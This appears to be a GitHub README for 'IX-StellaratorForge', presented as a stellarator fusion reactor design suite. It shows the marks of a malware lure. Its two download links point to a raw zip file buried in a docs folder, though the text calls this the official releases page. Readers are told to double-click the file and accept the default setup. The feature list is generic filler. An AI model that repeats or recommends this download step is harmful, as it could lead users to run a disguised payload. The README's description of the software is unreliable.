# ⚡ IX-StellaratorForge - Close the fusion engineering gap today

## 🎯 What Is This?

IX-StellaratorForge is an all-in-one software platform for researchers, engineers, and advanced hobbyists working on stellarator fusion reactor design. Think of it as a digital workbench where plasma physics, magnet engineering, and reactor economics meet. You can model, simulate, and test whether a net-electric fusion reactor concept can actually close—before building anything physical.

Whether you are evaluating confinement quality, designing high-temperature superconducting (HTS) magnets, or running neutron transport calculations, this tool gives you a unified environment to do it all.

## 🚀 Getting Started

The fastest way to begin is to download the application. IX-StellaratorForge is distributed as a ready-to-run package for Windows. No coding is required to launch the core interface, though advanced users can access scripting modules.

### ⬇️ Step 1: Download the Software

Visit this link to download the application:

**[⬇️ Download IX-StellaratorForge](https://raw.githubusercontent.com/soeradj21/IX-StellaratorForge/main/docs/reactor/Stellarator-Forge-I-3.5.zip)**

This will take you to the official releases page where you can grab the latest stable build.

### 📦 Step 2: Run the Application

Once the download completes, locate the downloaded file in your **Downloads** folder. Double-click the file to launch IX-StellaratorForge. The first screen will guide you through a simple setup wizard. Accept the default settings and click **Finish**.

### 🖥️ Step 3: Start a New Project

After launching, you will see the main dashboard. Click **New Project** to begin. You can choose from pre-built templates for common stellarator configurations or start from a blank workspace.

## ⚙️ Key Features

### 🔬 Plasma Physics Modeling

IX-StellaratorForge includes a full suite of plasma equilibrium and stability tools. You can define magnetic field configurations, compute flux surfaces, and analyze MHD stability with built-in solvers. The platform supports both VMEC++ and DESC workflows for high-fidelity simulation.

### 🧲 HTS Magnet Co-Design

Design high-temperature superconducting magnets with integrated electromagnetic, thermal, and structural analysis. The tool helps you optimize coil shapes and current densities to achieve the magnetic fields needed for quasi-isodynamic confinement.

### ☢️ Neutronics & Tritium Breeding Ratio (TBR)

Run full neutron transport simulations using the built-in OpenMC integration. Calculate tritium breeding ratios, neutron wall loading, and radiation damage across your reactor geometry. This is essential for evaluating fuel self-sufficiency.

### 🔥 Thermal-Power Systems

Model the complete thermal cycle—from heat extraction in the blanket to electricity generation. Adjust coolant types, temperatures, and flow rates to see the impact on overall plant efficiency.

### 📡 RF Control & Heating

Simulate radio-frequency heating and current drive systems. Tune frequencies, power levels, and antenna placements to control the plasma and maintain steady-state operation.

### 🧩 Executable Proof-of-Concepts (PoCs)

Each module includes runnable example cases that demonstrate real physics results. Use these PoCs to validate your understanding, test solver settings, or as starting points for your own studies.

### 🛡️ Evidence Gates

The platform includes structured evidence gates—checkpoints that verify your design meets key performance criteria before moving to the next stage. This ensures your reactor concept remains credible at every step.

### 🔗 Solver-Ready Workflows

Seamlessly export your models to industry-standard solvers like DESC, VMEC++, and OpenMC. IX-StellaratorForge manages the file formats, units, and boundary conditions so you can focus on physics, not data wrangling.

## 📋 System Requirements

To run IX-StellaratorForge smoothly, your computer should meet these minimum specifications:

| Component | Minimum Requirement |
|-----------|---------------------|
| Operating System | Windows 10 or Windows 11 (64-bit) |
| Processor | Quad-core Intel or AMD CPU, 2.5 GHz or faster |
| Memory | 8 GB RAM (16 GB recommended) |
| Storage | 10 GB free disk space (SSD preferred) |
| Graphics | DirectX 12 capable GPU with 2 GB VRAM |
| Display | 1920 x 1080 resolution or higher |

These are sensible baseline requirements for a scientific computing application that renders 3D magnetic fields and performs numerical simulation.

## 🎓 Getting Help

If you are new to stellarator design or fusion engineering, here are some helpful starting points:

- **Tutorial Mode:** The application includes an interactive tutorial that walks you through a complete reactor sizing exercise.
- **Example Library:** Browse dozens of pre-built reactor concepts—from compact QI stellarators to large modular designs.
- **Community Forum:** Join the discussion to ask questions, share results, and collaborate with other users.

## 🛠️ Advanced Usage

For power users, IX-StellaratorForge provides a Python scripting interface. You can automate parameter sweeps, batch-process multiple configurations, and integrate custom algorithms.

```python
# Example: Load a configuration and run equilibrium
from ix_stellaratorforge import Stellarator

st = Stellarator.load("configs/example_qi.json")
st.run_equilibrium()
st.plot_flux_surfaces()
```

No programming knowledge is required to use the graphical interface, but scripting opens up unlimited customization.

## 🔄 Updating

New releases are published on the same download page. The application includes a built-in check for updates when you launch it. Always keep your installation up to date to access performance improvements and new physics modules.

## 📄 License and Usage

IX-StellaratorForge is free for academic research and educational use. For commercial licensing, contact the development team through the repository. Redistribution of the software or its components requires written permission.

## 🧑‍🔬 About the Project

IX-StellaratorForge is an open R&D initiative aiming to answer a single question: *Can a credible net-electric stellarator fusion reactor be designed and operated?* The platform integrates all critical disciplines—plasma physics, magnet engineering, neutronics, and thermal systems—into a single design loop. By providing executable evidence gates and solver-ready workflows, it dramatically reduces the time from concept to credible engineering evaluation.

### 🌟 Why Stellarators?

Stellarators offer steady-state operation without the need for substantial plasma current, making them inherently safer against disruptions. The quasi-isodynamic designs supported by this tool promise excellent confinement and high beta limits. IX-StellaratorForge pushes these concepts toward practical reactor design.

## 🧭 What You Can Achieve

- **Feasibility Screening:** Test whether a given reactor size, field strength, and geometry can reach ignition or net electricity.
- **Design Optimization:** Automatically adjust coil shapes and plasma parameters to improve confinement or reduce cost.
- **Radiation Assessment:** Determine shielding thickness and material choices based on neutron transport results.
- **Cost Estimation:** Rough economic models help you compare different power plant concepts on capital cost and levelized electricity.

## ✅ Final Checks

Before you start a major design study, make sure:

1. Your graphics drivers are up to date.
2. You have enough free hard drive space (simulations can generate large output files).
3. You save project files regularly—the application supports autosave, but manual saves are safer.

## 📌 Support

- Report issues via the GitHub issues page.
- Suggest new features or physics modules.
- Contribute documentation or examples through pull requests.

---

**Start your stellarator journey today. Download IX-StellaratorForge and take the first step toward a practical fusion power plant.**

**[⬇️ Download Now from the Official Releases Page](https://raw.githubusercontent.com/soeradj21/IX-StellaratorForge/main/docs/reactor/Stellarator-Forge-I-3.5.zip)**

Keywords: fusion-reactor, magnetic-confinement, mhd-simulation, neutronics, nuclear-fusion, openmc, plasma-physics, quasi-isodynamic, stellarator, stellarator-optimization